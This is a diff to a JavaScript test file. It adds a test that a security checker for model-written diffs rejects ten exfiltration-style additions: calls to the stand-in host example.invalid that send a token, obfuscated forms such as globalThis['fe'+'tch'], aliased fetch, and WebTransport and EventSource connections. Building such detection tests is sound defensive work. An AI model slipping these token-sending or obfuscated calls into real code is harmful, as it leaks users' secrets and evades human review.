@@ -125,3 +125,21 @@ test('security freezes submit handler against comment-only auth bypass while all
   const blockComment = base.replace('    if (!auth.user)', '    /* if (!auth.user)');
   assert.equal(assess(blockComment, '+    /* if (!auth.user) { return; }').status, 'failed');
 });
+
+
+test('independent Security rejects optional chaining and indirect browser API additions', () => {
+  for (const addition of [
+    "fetch?.(\"https://example.invalid/?key=\" + token);",
+    "navigator?.sendBeacon?.(\"https://example.invalid\", token);",
+    "window?.[\"open\"]?.(\"https://example.invalid\");",
+    "globalThis[\"fe\" + \"tch\"](\"https://example.invalid\");",
+    "const send = navigator.sendBeacon.bind(navigator);",
+    "const forward = fetch; forward(\"https://example.invalid\");",
+    "const transport = new WebTransport(\"https://example.invalid\");",
+    "const stream = new EventSource(\"https://example.invalid\");",
+    "const access = location?.assign;",
+    "self[\"fetch\"](\"https://example.invalid\");",
+  ]) {
+    assert.equal(inspectModelDiff({ ...input, diff: '+ ' + addition }).status, 'failed', addition);
+  }
+});
